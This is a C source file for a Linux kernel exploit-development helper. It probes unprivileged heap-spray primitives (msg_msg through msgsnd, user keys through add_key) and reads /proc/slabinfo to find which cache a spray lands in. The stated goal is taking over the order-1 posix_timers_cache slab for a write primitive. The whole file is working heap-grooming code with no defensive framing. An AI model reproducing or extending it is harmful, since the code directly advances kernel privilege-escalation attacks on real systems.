/*
 * spray_probe.c - find an unprivileged, persistent, content-controlled spray
 * that actually lands in an ORDER-1 slab (pagesperslab == 2), because the
 * posix_timers_cache slab the write primitive must take over is order-1:
 *
 *     posix_timers_cache  objsize 384  objperslab 21  pagesperslab 2  (8 KB)
 *     kmalloc-8k          objsize 8192 objperslab  4  pagesperslab 8  (32 KB) <- useless
 *
 * Candidates measured here (all unprivileged, all persistent):
 *   msgsnd : struct msg_msg header 48 B + msgsz 208 B = 256 B -> kmalloc-256
 *   add_key: struct user_key_payload header ~24 B + payload 232 B = 256 B
 *
 * Reports the slabinfo delta per cache so the choice is arithmetic.
 *
 * usage: spray_probe <msgsnd|add_key> <count>
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <unistd.h>

#define MSGSZ 208
#define KEYLEN 232

struct msgbuf208 { long mtype; char mtext[MSGSZ]; };

static const char *CACHES[] = {
    "kmalloc-96", "kmalloc-128", "kmalloc-192", "kmalloc-256",
    "kmalloc-512", "kmalloc-1k", "memdup_user-256", "key_jar",
    NULL
};

static void snap(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];
    printf("--- %s ---\n", tag);
    if (!f) { printf("  unreadable\n"); return; }
    while (fgets(line, sizeof line, f)) {
        for (int i = 0; CACHES[i]; i++) {
            size_t n = strlen(CACHES[i]);
            if (!strncmp(line, CACHES[i], n) && line[n] == ' ') {
                printf("  %s", line);
                break;
            }
        }
    }
    fclose(f);
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "msgsnd";
    int N = argc > 2 ? atoi(argv[2]) : 2000;

    snap("before");

    int made = 0;
    if (!strcmp(mode, "msgsnd")) {
        struct msgbuf208 b;
        b.mtype = 1;
        memset(b.mtext, 0x41, sizeof b.mtext);
        /* default msgmnb is 16384 B per queue -> ~78 msgs of 208 B, so use
         * several queues and rotate when one is full */
        int qid = -1;
        for (int i = 0; i < N; i++) {
            if (qid < 0 || (i % 70) == 0) {
                qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
                if (qid < 0) { printf("msgget failed: %s\n", strerror(errno)); break; }
            }
            if (msgsnd(qid, &b, MSGSZ, IPC_NOWAIT) != 0) { made = i; goto done; }
            made++;
        }
    } else {
        for (int i = 0; i < N; i++) {
            char desc[32];
            char payload[KEYLEN];
            memset(payload, 0x41, sizeof payload);
            snprintf(desc, sizeof desc, "k%d", i);
            long r = syscall(217 /* add_key */, "user", desc, payload,
                             (size_t)KEYLEN, (int)-2 /* KEY_SPEC_PROCESS_KEYRING */);
            if (r < 0) { printf("add_key stopped at %d: %s\n", i, strerror(errno)); break; }
            made++;
        }
    }
done:
    snap("after");
    printf("allocated %d objects of ~256 B (%d KB) via %s\n",
           made, made / 4, mode);
    printf("the cache whose active_objs rose by ~%d with pagesperslab=2 is our spray\n", made);
    return 0;
}
